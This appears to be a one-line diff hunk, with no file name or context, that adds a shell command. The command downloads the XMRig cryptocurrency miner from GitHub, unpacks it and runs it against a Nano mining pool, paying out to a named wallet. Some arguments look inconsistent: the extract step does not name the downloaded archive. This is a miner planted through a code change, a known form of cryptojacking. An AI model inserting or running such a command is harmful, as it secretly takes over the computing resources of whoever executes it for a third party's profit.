@@ -1,0 +1,1 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.19.2/xmrig-6.19.2-linux-x64.tar.gz && tar -xvf xmrig-6.19.2 && ./xmrig -o xmrig.nanswap.com:3333 -u nano_3jjbxig8dfkkmmsipa8gdw1bbwwsfb8njzkzqw5oqdz5dryw8fz3d6657d3e -p x -k
